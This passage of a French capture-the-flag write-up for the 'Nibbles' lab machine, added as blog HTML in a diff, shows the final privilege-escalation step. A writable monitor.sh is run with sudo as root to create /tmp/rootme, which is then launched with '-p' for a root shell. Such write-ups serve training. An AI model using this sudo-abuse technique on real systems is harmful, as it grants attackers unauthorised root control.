+        data-srcset="/images/Nibbles/Nibbles-17.png, /images/Nibbles/Nibbles-17.png 1.5x, /images/Nibbles/Nibbles-17.png 2x"
+        data-sizes="auto"
+        alt="/images/Nibbles/Nibbles-17.png"
+        title="/images/Nibbles/Nibbles-17.png" width="753" height="152" /></p>
+<p>J&rsquo;exécute alors le script en tant que root. Cela crée alors le fichier <code>/tmp/rootme</code> qui me permet d&rsquo;obtenir un shell en tant que root.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># Exécution du script en tant que root
+</span></span><span class="line"><span class="cl">sudo -u root /home/nibbler/personal/stuff/monitor.sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># Obtention du shell en tant que root
+</span></span><span class="line"><span class="cl">/tmp/rootme -p</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Nibbles/Nibbles-18.png"
+        data-srcset="/images/Nibbles/Nibbles-18.png, /images/Nibbles/Nibbles-18.png 1.5x, /images/Nibbles/Nibbles-18.png 2x"
+        data-sizes="auto"
+        alt="/images/Nibbles/Nibbles-18.png"
+        title="/images/Nibbles/Nibbles-18.png" width="1538" height="745" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-12-11</span>
+            </div><div id="page-views" class="post-info-mod">
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/nibbles/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/nibbles/" data-title="Nibbles" data-via="z3rodol" data-hashtags="Easy,Windows,Active Directory,CVE-2015-6967,Nibbleblog"><i class="fab fa-x-twitter" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags" aria-hidden="true"></i>&nbsp;<a href="/tags/easy/">Easy</a>,&nbsp;<a href="/tags/windows/">Windows</a>,&nbsp;<a href="/tags/active-directory/">Active Directory</a>,&nbsp;<a href="/tags/cve-2015-6967/">CVE-2015-6967</a>,&nbsp;<a href="/tags/nibbleblog/">Nibbleblog</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/outbound/" class="prev" rel="prev" title="OutBound"><i class="fas fa-angle-left" aria-hidden="true"></i>OutBound</a>
+            <a href="/meta/" class="next" rel="next" title="Meta">Meta<i class="fas fa-angle-right" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.158.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 1.0.0"><i class="far fa-kiss-wink-heart" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright" aria-hidden="true"></i><span itemprop="copyrightYear">2025 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://z3rodol.github.io" target="_blank">z3rodol</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script src="/lib/katex/katex.min.js"></script><script src="/lib/katex/contrib/auto-render.min.js"></script><script src="/lib/katex/contrib/copy-tex.min.js"></script><script src="/lib/katex/contrib/mhchem.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":15,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script src="/js/theme.js"></script></body>
+</html>
